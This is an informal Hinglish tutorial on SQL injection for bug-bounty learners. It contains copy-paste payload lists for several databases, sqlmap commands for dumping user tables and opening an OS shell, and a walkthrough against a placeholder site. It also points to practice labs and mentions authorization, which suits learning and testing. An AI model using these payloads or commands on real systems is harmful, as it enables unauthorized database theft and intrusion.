# 🛡️ SQL Injection — Complete Guide

> **Level:** Intermediate | **Time:** 4-5 hours | **Difficulty:** ⭐⭐

---

## 📖 Kya Hai SQL Injection?

**SQL Injection matlab database mein apna code daalna.**

Jab website user input ko properly check nahi karti, tum database se kuch bhi nikal sakte ho:
- User data
- Admin passwords
- Business secrets
- Credit card numbers
- Aur jo bhi database mein hai!

---

## 🎯 Kaise Kaam Karta Hai?

### Normal Query
```sql
SELECT * FROM users WHERE username='admin' AND password='123';
```

### SQLi Attack
```sql
-- Username field mein likho:
admin' OR '1'='1

-- Query ban jayega:
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything';
-- Ye HAMESHA TRUE hoga!
```

### Result
✅ Login ho gaye bina password ke! 🎉

---

## 3️⃣ Types of SQL Injection

### 1. **Boolean-Based Blind SQLi**
- Response TRUE/FALSE milta hai
- Ek character ek ek kar ke find karna padta hai
- Slow lekin reliable

```sql
admin' AND SUBSTRING(password,1,1)='a
response: TRUE/FALSE
```

### 2. **Time-Based Blind SQLi**
- Response delay se data malum karna
- Server ko SLEEP karate ho
- Bahut slow

```sql
admin' AND IF(1=1, SLEEP(5), 0)
response: 5 second delay = TRUE
```

### 3. **Error-Based SQLi**
- Database error messages se data nikalna
- Sabse fast
- Sabse easy

```sql
admin' AND extractvalue(1, concat(0x7e, (SELECT password)))
response: XPATH syntax error: '~password_value'
```

### 4. **Union-Based SQLi**
- UNION query lagakar data merge karna
- Result directly visible
- Fastest method

```sql
admin' UNION SELECT username, password FROM users--
response: सभी users visible!
```

---

## 4️⃣ Detection

### Manual Testing
```
1. Single quote lagao: ' 
   → Error? = Vulnerable!
   
2. Boolean test: ' OR '1'='1
   → Result change? = Vulnerable!
   
3. Time delay: ' AND SLEEP(5)--
   → 5 second wait? = Vulnerable!
```

### Automated Scanning
```bash
# SQLMap (Best tool)
sqlmap -u "http://target.com/login?user=admin&pass=123" \
  --forms \
  --dbs \
  -v 3
```

---

## 💣 Payloads (Copy-Paste Ready!)

### Basic SQLi
```
' OR '1'='1
' OR 1=1--
' OR 'a'='a
admin'--
admin' #
admin'/*
1' UNION SELECT NULL--
```

### MySQL Payloads
```
admin' OR 1=1 LIMIT 1--
' UNION SELECT version()--
' UNION SELECT database()--
' UNION SELECT user()--
' UNION SELECT table_name FROM information_schema.tables--
```

### PostgreSQL
```
admin' OR true--
' UNION SELECT version()--
' UNION SELECT current_database()--
' UNION SELECT current_user--
```

### MSSQL
```
admin' OR 1=1--
' UNION SELECT @@version--
' UNION SELECT DB_NAME()--
' UNION SELECT SYSTEM_USER--
```

---

## 🔧 Commands (Tools)

### SQLMap - Most Powerful
```bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# Extract databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Extract tables
sqlmap -u "http://target.com/page?id=1" -D database_name --tables

# Extract data
sqlmap -u "http://target.com/page?id=1" -D database_name -T users --dump

# Get shell
sqlmap -u "http://target.com/page?id=1" --os-shell

# Aggressive
sqlmap -u "http://target.com/page?id=1" -p id --level=5 --risk=3
```

### Manual Testing with curl
```bash
# Test
curl "http://target.com/page?id=1' OR '1'='1"

# With data
curl -X POST -d "user=admin'--&pass=anything" http://target.com/login
```

---

## 🎯 Real Example (Step-by-Step)

### Target: http://vulnerable-site.com/login

**Step 1:** Test for vulnerability
```
Username: admin' OR '1'='1
Password: anything
```

**Step 2:** Agar login ho gaye = VULNERABLE!

**Step 3:** SQLMap se exploit
```bash
sqlmap -u "http://vulnerable-site.com/login" \
  --forms \
  -D vulnerable_db \
  -T users \
  --dump
```

**Step 4:** Database mil gaya!
```
username | password | email
admin    | abc123   | admin@site.com
john     | qwerty   | john@site.com
```

**Step 5:** Report likho aur paise kamaao! 💰

---

## 🧪 Practice Labs

- ☑️ **DVWA:** SQL Injection section
- ☑️ **Juice Shop:** All SQL injection challenges
- ☑️ **PortSwigger:** SQL Injection labs (25 labs!)
- ☑️ **HackTheBox:** Web challenges with SQLi
- ☑️ **TryHackMe:** SQL Injection rooms

---

## 📺 Video

- [IppSec - SQL Injection](https://youtube.com/watch?v=...)
- [LiveOverflow - SQLi Deep Dive](https://youtube.com/watch?v=...)
- [John Hammond - Bug Bounty SQLi](https://youtube.com/watch?v=...)

---

## 📚 References

- [OWASP SQLi](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQLi Guide](https://portswigger.net/web-security/sql-injection)
- [SQLMap Documentation](https://sqlmap.org/)
- [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)

---

## ✅ Checklist

- [ ] Theory padha (SQL queries samjho)
- [ ] Manual testing try kiya
- [ ] SQLMap install kiya
- [ ] DVWA mein practice kiya
- [ ] PortSwigger labs complete kiye
- [ ] Real target pe test kiya (authorized!)
- [ ] Bug report likha
- [ ] Payouts earned! 💰

---

## 🎓 Key Takeaways

✨ **SQLi = Web Hacking ka sabse common vulnerability**
✨ **Easy find karne mein, hard exploit karne mein challenging**
✨ **Practice karo regularly, expert ban jao!**

---

**Next:** 02-xss/ → Cross-Site Scripting seekhte hain!